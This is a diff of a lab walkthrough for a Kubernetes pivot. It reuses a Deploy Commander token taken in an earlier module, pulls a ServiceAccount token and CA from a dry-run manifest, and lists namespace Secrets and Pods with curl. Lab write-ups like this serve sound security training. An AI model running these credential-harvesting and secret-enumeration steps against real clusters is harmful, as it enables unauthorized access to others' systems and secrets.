@@ -24,10 +24,30 @@ Use the Deploy Commander token retrieved from M4 to list applications and reques
 
 ## Step-by-Step Exploitation
 
-### Step 1 — List applications
+### Step 1 — Prepare the workspace and verify Deploy Commander
+
+Use the same Kali terminal as M1–M4. Keep the workspace private:
 
 ```bash
-DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
+export RANGE3_DIR="${RANGE3_DIR:-$(mktemp -d /tmp/range3.XXXXXX)}"
+```
+
+```bash
+chmod 700 "$RANGE3_DIR"
+```
+
+```bash
+umask 077
+```
+
+```bash
+curl --max-time 8 -fsS http://203.0.3.36:8888/api/health | jq .
+```
+
+Load the Deploy Commander token retrieved from M4:
+
+```bash
+export DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
 ```
 
 ```bash
@@ -39,10 +59,6 @@ The response includes `pul-ota-firmware`.
 ### Step 2 — Request a dry-run manifest
 
 ```bash
-umask 077
-```
-
-```bash
 curl --max-time 8 -fsS -X POST "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" -H "Authorization: Bearer ${DEPLOY_TOKEN}" -o "$RANGE3_DIR/dryrun.json"
 ```
 
@@ -52,7 +68,7 @@ jq '{result, warning, manifest_present: (.manifest != null)}' "$RANGE3_DIR/dryru
 
 <img width="1307" height="220" alt="Earlier Deploy Commander dry-run response; does not verify the current cluster endpoint" src="https://github.com/user-attachments/assets/c14f2f6e-e498-418c-a92e-1505c37781e7" />
 
-The earlier screenshot for this step shows a successful dry-run response, but predates the live cluster endpoint update. It does not verify the current endpoint.
+The screenshot is historical and does not verify the current cluster endpoint. The live command above returns the current manifest.
 
 The API returns the manifest without applying the Deployment. The manifest now points to the provisioned Kubernetes API at `203.0.2.188:6443` and the deployed registry at `203.0.3.36:5000`.
 
@@ -84,6 +100,12 @@ CLUSTER_CA_B64="$(printf '%s\n' "$M5_MANIFEST" | sed -n '/^data:/,/^---/s/^  ca.
 SA_TOKEN="$(printf '%s' "$SA_TOKEN_B64" | base64 -d)"
 ```
 
+After the Kubernetes host is reprovisioned, rerun Steps 2 and 3 before querying it. Values left in `CLUSTER_CA_B64` or `SA_TOKEN` from the previous cluster will fail TLS verification or authentication.
+
+```bash
+printf 'Current cluster endpoint: %s\n' "$CLUSTER_ENDPOINT"
+```
+
 ### Step 4 — Query the Kubernetes namespace
 
 The ServiceAccount is limited to reading Pods, Deployments, Services, ConfigMaps, and Secrets in `pul-production`.
@@ -100,19 +122,29 @@ curl --max-time 8 -sS -o /dev/null -w 'Cluster-wide secret list HTTP %{http_code
 
 Expected status: `403`. The API certificate is verified against the CA from the manifest; do not disable TLS verification. The Kubernetes API firewall allows the observed Kali source and the Deploy Commander host, and drops other sources.
 
+Check whether the namespace has Pods:
+
+```bash
+curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/pods" | jq -r 'if (.items|length)==0 then "No Pods in pul-production" else .items[].metadata.name end'
+```
+
 The cluster is a single-node K3s lab instance. The dry-run remains non-mutating; no firmware Deployment is applied by these commands.
 
 ### Live flag check
 
-The live check on 2026-11-03 reached the Kubernetes API at https://203.0.2.188:6443 with certificate verification enabled. In pul-production, the ServiceAccount can currently see only the pul-ota-deployer-token Secret and the cluster configuration ConfigMap. There are no Pods, Deployments, or Services in the namespace, and no flag Secret or ConfigMap is provisioned. The ServiceAccount Secret contains only its token, CA certificate, and namespace fields; their values are not printed here.
+The live check on 2026-11-04 reached the rebuilt Kubernetes API at `https://203.0.2.188:6443` with certificate verification enabled. In `pul-production`, the ServiceAccount can currently see only the `pul-ota-deployer-token` Secret and the cluster configuration ConfigMap. There are no Pods, Deployments, or Services in the namespace, and no flag Secret or ConfigMap is provisioned. The ServiceAccount Secret contains only its token, CA certificate, and namespace fields; their values are not printed here.
 
 List Secret names and data key names without exposing values:
 
-    curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer $SA_TOKEN" "$CLUSTER_ENDPOINT/api/v1/namespaces/pul-production/secrets" | jq -r '.items[] | [.metadata.name, ((.data // {}) | keys | join(","))] | @tsv'
+```bash
+curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/secrets" | jq -r '.items[] | [.metadata.name, ((.data // {}) | keys | join(","))] | @tsv'
+```
 
 Check for running Pods:
 
-    curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer $SA_TOKEN" "$CLUSTER_ENDPOINT/api/v1/namespaces/pul-production/pods" | jq -r '.items[].metadata.name'
+```bash
+curl --max-time 8 -fsS --cacert <(printf '%s' "$CLUSTER_CA_B64" | base64 -d) -H "Authorization: Bearer ${SA_TOKEN}" "${CLUSTER_ENDPOINT}/api/v1/namespaces/pul-production/pods" | jq -r 'if (.items|length)==0 then "No Pods in pul-production" else .items[].metadata.name end'
+```
 
 No flag was retrieved because the current namespace has no flag-bearing resource or application workload. A challenge workload and its flag must be provisioned in the lab before this pivot can produce a flag. Do not report the ServiceAccount token or dry-run response as the flag.
 
